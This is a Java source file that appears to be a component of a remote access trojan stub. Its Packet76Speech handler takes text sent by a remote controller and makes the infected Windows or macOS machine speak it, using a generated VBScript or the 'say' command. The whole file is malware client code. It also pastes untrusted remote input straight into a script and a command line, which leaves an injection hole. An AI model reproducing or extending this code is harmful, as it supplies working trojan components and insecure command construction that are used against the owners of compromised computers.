package com.redpois0n.stub.stub.packets.incoming;

import java.io.File;
import java.io.FileWriter;

import com.redpois0n.common.OperatingSystem;
import com.redpois0n.stub.Connection;



public class Packet76Speech extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		final String speech = Connection.readLine();
		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
			new Thread() {
				public void run() {
					try {
						File f = File.createTempFile("speech", ".vbs");
						FileWriter writer = new FileWriter(f, false);
						writer.write("Dim message, sapi\n");
						writer.write("message = \"" + speech + "\"\n");
						writer.write("Set sapi = CreateObject(\"sapi.spvoice\")\n");
						writer.write("sapi.Speak message");
						writer.close();

						Process p = Runtime.getRuntime().exec(new String[] { "cscript", f.getAbsolutePath() });
						p.waitFor();
						f.delete();
					} catch (Exception ex) {
						ex.printStackTrace();
					}
				}
			}.start();
		} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
			try {
				Runtime.getRuntime().exec("say " + speech);
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}
	}

}
